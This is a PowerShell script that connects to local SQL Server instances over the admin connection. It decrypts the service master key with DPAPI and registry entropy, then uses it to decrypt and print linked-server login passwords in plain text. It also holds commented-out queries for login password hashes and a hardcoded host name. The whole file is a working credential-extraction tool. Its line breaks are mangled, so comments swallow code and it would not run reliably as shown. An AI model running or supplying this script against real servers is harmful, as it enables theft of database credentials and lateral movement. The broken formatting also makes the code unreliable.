Add-Type -AssemblyName System.CoreAdd-Type -AssemblyName System.Security[string]$instanceName = "MSSQLSERVER"# Set local computername and get all SQL Server instances$ComputerName = "D2T24DBENRWV1"#get-cluster-name $clustno[string[]]$SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances
  
$Results = New-Object "System.Data.DataTable"$Results.Columns.Add("Instance") | Out-Null$Results.Columns.Add("Linkserver") | Out-Null$Results.Columns.Add("User") | Out-Null$Results.Columns.Add("Password") | Out-Nullforeach ($InstanceName in $SqlInstances[0]) {
# Start DAC connection to SQL Server# Default instance MSSQLSERVER -> instance name cannot be used in connection string
if ($InstanceName -eq "MSSQLSERVER") {
    $ConnString = "Server=ADMIN:$ComputerName\;Trusted_Connection=True"
}else {
    $ConnString = "Server=ADMIN:$ComputerName\$InstanceName;Trusted_Connection=True"
}
$Conn = New-Object System.Data.SqlClient.SQLConnection($ConnString);Try{$Conn.Open();}Catch{
    Write-Error "Error creating DAC connection: $_.Exception.Message"
    Continue
}
if ($Conn.State -eq "Open"){
    $SqlCmd="SELECT substring(crypt_property,9,len(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)"
    $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
    $SmkBytes=$Cmd.ExecuteScalar()
    # Get entropy from the registry - hopefully finds the right SQL server instance
    $RegPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\").$InstanceName
    [byte[]]$Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy
    # Decrypt the service master key
    $ServiceKey = [System.Security.Cryptography.ProtectedData]::Unprotect($SmkBytes, $Entropy, 'LocalMachine')
    $ServiceKey.Length 
    # Choose the encryption algorithm based on the SMK length - 3DES for 2008, AES for 2012
    # Choose IV length based on the algorithm
    if (($ServiceKey.Length -eq 16) -or ($ServiceKey.Length -eq 32)) {    if ($ServiceKey.Length -eq 16) {
		$Decryptor = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
        $Decryptor
        $IvLen=8
    } elseif ($ServiceKey.Length -eq 32){
        $Decryptor = New-Object System.Security.Cryptography.AESCryptoServiceProvider
        $IvLen=16
	}
  
	# Query link server password information from the DB
    # Remove header from pwdhash, extract IV (as iv) and ciphertext (as pass)
	# Ignore links with blank credentials (integrated auth ?)
    $SqlCmd = "SELECT sysservers.srvname,syslnklgns.name,substring(syslnklgns.pwdhash,5,$ivlen) iv,substring(syslnklgns.pwdhash,$($ivlen+5),
	len(syslnklgns.pwdhash)-$($ivlen+4)) pass FROM master.sys.syslnklgns inner join master.sys.sysservers on syslnklgns.srvid=sysservers.srvid WHERE len(pwdhash)>0"
#       $SqlCmd = "SELECT sysxlgns.name,substring(sysxlgns.pwdhash,5,$ivlen) iv, substring(sysxlgns.pwdhash, $($ivlen+5), len(sysxlgns.pwdhash)-$($ivlen+4)) pass FROM master.sys.sysxlgns WHERE len(pwdhash)>0 and name not like '#%'"
#       $SqlCmd = "SELECT sysxlgns.name,substring(sysxlgns.pwdhash,5,32)     iv, substring(sysxlgns.pwdhash, 32+5,        len(sysxlgns.pwdhash)-32+4)        pass FROM master.sys.sysxlgns WHERE len(pwdhash)>0 and name not like '#%'"
    $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);	$Data=$Cmd.ExecuteReader()
    $Dt = New-Object "System.Data.DataTable"
	$Dt.Load($Data)
	# Go through each row in results    foreach ($Logins in $Dt) {
        # decrypt the password using the service master key and the extracted IV	    $Decryptor.Padding = "None"        $Decrypt = $Decryptor.CreateDecryptor($ServiceKey,$Logins.iv)		$Stream = New-Object System.IO.MemoryStream (,$Logins.pass)		$Crypto = New-Object System.Security.Cryptography.CryptoStream $Stream,$Decrypt,"Write"		$Crypto.Write($Logins.pass,0,$Logins.pass.Length)		[byte[]]$Decrypted = $Stream.ToArray()
		# convert decrypted password to unicode		$EncodingType = "System.Text.UnicodeEncoding"		$Encode = New-Object $EncodingType		
		# Print results - removing the weird padding (8 bytes in the front, some bytes at the end)... 		# Might cause problems but so far seems to work.. may be dependant on SQL server version...
		# If problems arise remove the next three lines.. 
		$i=8		foreach ($b in $Decrypted) {if ($Decrypted[$i] -ne 0 -and $Decrypted[$i+1] -ne 0 -or $i -eq $Decrypted.Length) {$i -= 1; break;}; $i += 1;}		$Decrypted = $Decrypted[8..$i]
		$Results.Rows.Add($InstanceName,$($Logins.srvname),$($Logins.name),$($Encode.GetString($Decrypted))) | Out-Null
    }
    } else {
    Write-Error "Unknown key size"
	}
    $Conn.Close();
}}$Results


#Get-MSSQLLinkPasswords -instanceName MSSQLSERVER